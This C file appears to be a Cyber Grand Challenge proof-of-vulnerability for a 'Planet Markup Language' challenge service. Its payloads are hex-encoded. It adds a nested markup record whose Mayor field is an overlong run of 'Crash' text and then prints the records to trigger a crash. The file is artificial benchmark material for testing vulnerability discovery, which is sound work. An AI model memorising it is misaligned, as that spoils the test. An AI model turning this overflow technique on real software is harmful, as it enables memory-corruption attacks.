#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x53\x65\x6c\x65\x63\x74\x69\x6f\x6e\x3a\x20";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 11);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x0a\x50\x6c\x61\x6e\x65\x74\x20\x4d\x61\x72\x6b\x75\x70\x20\x4c"
         "\x61\x6e\x67\x75\x61\x67\x65\x20\x4d\x61\x69\x6e\x0a\x31\x29\x20"
         "\x50\x72\x69\x6e\x74\x20\x50\x6c\x61\x6e\x65\x74\x73\x0a\x32\x29"
         "\x20\x41\x64\x64\x20\x50\x4d\x4c\x0a\x33\x29\x20\x41\x64\x64\x20"
         "\x50\x6c\x61\x6e\x65\x74\x0a\x34\x29\x20\x53\x65\x6c\x65\x63\x74"
         "\x20\x50\x6c\x61\x6e\x65\x74\x0a\x35\x29\x20\x45\x78\x69\x74\x0a"
         "\x53\x65\x6c\x65\x63\x74\x69\x6f\x6e\x3a\x20";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 107);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x32\x0a";
      static unsigned int write_00000_00000_len = 2;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x20";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 1);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x50\x4d\x4c\x3a\x20";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 5);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x7b\x50\x6c\x61\x6e\x65\x74\x7d\x7b\x43\x6f\x75\x6e\x74\x72\x79"
         "\x7d\x7b\x54\x65\x72\x72\x69\x74\x6f\x72\x79\x7d\x7b\x43\x6f\x75"
         "\x6e\x74\x79\x7d\x7b\x43\x69\x74\x79\x7d\x7b\x4d\x61\x79\x6f\x72"
         "\x7d\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68"
         "\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68\x43"
         "\x72\x61\x73\x68\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68\x43\x72"
         "\x61\x73\x68\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68\x43\x72\x61"
         "\x73\x68\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68\x43\x72\x61\x73"
         "\x68\x43\x72\x61\x73\x68\x43\x72\x61\x73\x68\x7b\x23\x4d\x61\x79"
         "\x6f\x72\x7d\x7b\x23\x43\x69\x74\x79\x7d\x7b\x23\x43\x6f\x75\x6e"
         "\x74\x79\x7d\x7b\x23\x54\x65\x72\x72\x69\x74\x6f\x72\x79\x7d\x7b"
         "\x23\x43\x6f\x75\x6e\x74\x72\x79\x7d\x7b\x23\x50\x6c\x61\x6e\x65"
         "\x74\x7d\x0a";
      static unsigned int write_00001_00000_len = 195;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x53\x65\x6c\x65\x63\x74\x69\x6f\x6e\x3a\x20";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 11);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x0a\x50\x6c\x61\x6e\x65\x74\x20\x4d\x61\x72\x6b\x75\x70\x20\x4c"
         "\x61\x6e\x67\x75\x61\x67\x65\x20\x4d\x61\x69\x6e\x0a\x31\x29\x20"
         "\x50\x72\x69\x6e\x74\x20\x50\x6c\x61\x6e\x65\x74\x73\x0a\x32\x29"
         "\x20\x41\x64\x64\x20\x50\x4d\x4c\x0a\x33\x29\x20\x41\x64\x64\x20"
         "\x50\x6c\x61\x6e\x65\x74\x0a\x34\x29\x20\x53\x65\x6c\x65\x63\x74"
         "\x20\x50\x6c\x61\x6e\x65\x74\x0a\x35\x29\x20\x45\x78\x69\x74\x0a"
         "\x53\x65\x6c\x65\x63\x74\x69\x6f\x6e\x3a\x20";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 107);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x31\x0a";
      static unsigned int write_00002_00000_len = 2;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x50\x6c\x61\x6e\x65\x74\x20\x4d\x61\x72\x6b\x75\x70\x20\x4c\x61"
         "\x6e\x67\x75\x61\x67\x65";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 22);
      if (read_00003_res) {} //silence unused variable warning
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
}
